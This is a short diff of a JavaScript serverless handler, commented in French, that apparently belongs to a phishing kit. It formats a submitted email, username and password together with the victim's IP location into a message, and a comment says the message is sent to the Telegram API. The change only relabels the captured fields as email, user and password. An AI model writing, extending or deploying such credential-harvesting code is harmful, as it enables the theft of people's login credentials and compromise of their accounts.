@@ -61,9 +61,9 @@ export async function handler(event) {
     const message = `
 📩 Nouveau formulaire
 🌍 IP : ${ipLocation}
-👤 Nom : ${usermail}
-👤 Prénom : ${user}
-👤 Prénom : ${pass}
+👤 EMaiL : ${usermail}
+👤 UsSER : ${user}
+👤 PPass : ${pass}
     `;
 
     // Envoi du message à l'API Telegram
@@ -114,3 +114,4 @@ export async function handler(event) {
     };
   }
 }
+
